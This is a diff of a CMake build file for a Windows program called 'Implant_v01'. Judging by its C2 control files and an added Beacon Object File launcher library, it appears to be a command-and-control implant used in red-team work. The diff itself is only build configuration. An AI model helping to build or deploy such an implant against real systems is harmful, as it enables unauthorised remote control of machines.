@@ -17,7 +17,6 @@ set(CMAKE_RUNTIME_OUTPUT_DIRECTORY "/output")
 set(SOURCES
     "Implant_v01.cpp"
     "Implant_v01.h"
-    
     "control/settings.h"
     "protocols/json/json.h"
     "data/msgpack/msgpack.cpp"
@@ -33,11 +32,30 @@ set(SOURCES
     "control/c2.cpp"
     "control/commandtree.cpp"
     "control/commandtree.h"
-
+    "modules/cd.cpp" 
+    "modules/cd.h" 
+    "modules/strategy.cpp" 
+    "modules/ls.cpp" 
+    "modules/files.cpp" 
+    "modules/files.h" 
+    "data/structs.h"  
+    "systems/memstore.h" 
+    "modules/metadata.cpp" 
+    "modules/metadata.h"
+    "modules/bof.cpp"
+    "modules/bof.h"
+    "libs/bof_launcher_api.h"
 )
-
-add_executable (Implant_v01 ${SOURCES} "modules/cd.cpp" "modules/cd.h" "modules/strategy.cpp" "modules/ls.cpp" "modules/files.cpp" "modules/files.h" "data/structs.h"  "systems/memstore.h" "modules/metadata.cpp" "modules/metadata.h")
-
+add_executable(Implant_v01 ${SOURCES})
+# ==========================================
+# External Libraries (BofRunner)
+# ==========================================
+add_library(BofRunner STATIC IMPORTED)
+set_target_properties(BofRunner PROPERTIES
+    IMPORTED_LOCATION "${CMAKE_CURRENT_SOURCE_DIR}/libs/bof_launcher_win_x64.lib"
+    # This tells CMake where the .h file is located
+    INTERFACE_INCLUDE_DIRECTORIES "${CMAKE_CURRENT_SOURCE_DIR}/libs"
+)
 # ==========================================
 # 3. Target Platform Logic (Windows)
 # ==========================================
@@ -49,6 +67,14 @@ if(WIN32)
     target_sources(Implant_v01 PRIVATE 
         "protocols/http_wininet/http.cpp"
         "protocols/http_wininet/http.h"
+    )
+    # BofRunner must come first due to linker things
+    target_link_libraries(Implant_v01 PRIVATE 
+        BofRunner 
+        wininet 
+        ws2_32 
+        crypt32
+        ntdll # for bof launcher
     )
 
     # --- MSVC Specific (Native Windows Build) ---
@@ -78,11 +104,12 @@ if(WIN32)
         
         # 2. Link System Libraries
         # MinGW needs explicit linking for WinINet and Winsock
-        target_link_libraries(Implant_v01 PRIVATE 
-            wininet 
-            ws2_32 
-            crypt32
-        )
+        #target_link_libraries(Implant_v01 PRIVATE 
+        #    wininet 
+        #    ws2_32 
+        #    crypt32
+        #    BofRunner
+        #)
 
         # set some stuff for optimizations
         set(CMAKE_CXX_FLAGS_RELEASE "-Os")
